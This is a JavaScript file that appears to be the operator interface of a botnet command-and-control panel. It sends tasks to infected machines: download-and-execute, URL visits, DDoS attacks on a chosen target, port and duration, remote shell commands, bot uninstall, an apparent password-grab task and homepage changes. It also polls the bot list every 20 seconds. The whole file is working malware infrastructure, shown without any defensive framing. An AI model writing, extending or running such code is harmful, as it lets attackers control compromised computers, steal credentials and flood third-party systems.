function regForm()
{
	$("input[type='submit']").click(function(e){
		e.preventDefault();
		var form = $('.botid').serialize();
		var index = $("input[type='submit']").index(this);
		switch(index){
			case 0:
				form += "&exec=1&" + $('input[name="link"]').serialize();
				break;
			case 1:
				form += "&visit=1&" + $('input[name="url"]').serialize() + "&visible=" + $('select[name="visible"]').val();
				break;
			case 2:
				form += "&ddos=1&type=" + $('select[name="type"]').val() + "&" + $('input[name="target"]').serialize()
					+ "&" + $('input[name="port"]').serialize() + "&" + $('input[name="time"]').serialize();
				break;
			case 3:
				form += "&cmd=1&" + $('input[name="command"]').serialize();
				break;
			case 4:
				if(!confirm("Uninstall bot?")) return;
				form += "&kill=1";
				break;
			case 5:
				form += "&pass=1";
				break;
			case 6:
				form += "&home=1&" + $('input[name="page"]').serialize();
				break;
		}
		$.post('ajax/task.php',form,function(data){
			$('.task-result').eq(index).html(data);
		});
	});
}

function getBots()
{
	var checks = {};
	for(var i=0; i<document.getElementsByClassName('botid').length; i++)
		checks[document.getElementsByClassName('botid')[i].value] = document.getElementsByClassName('botid')[i].checked;
	$('.botlist').load("ajax/botlist.php?init="+getPvar('init')+"&end="+getPvar('end'),
		function() {
			$('.loading').hide();
			for(key in checks)
				for(var i=0; i<document.getElementsByClassName('botid').length; i++)
				if(document.getElementsByClassName('botid')[i].value == key)
					document.getElementsByClassName('botid')[i].checked = checks[key];
			$("#checkall").click(function () {
				if ($("#checkall").is(':checked'))
				{
					$(".botid").prop("checked", true);
				}
				else
				{
					$(".botid").prop("checked", false);
				}
			});
	    });
}

setInterval(function(){ getBots(); }, 20000);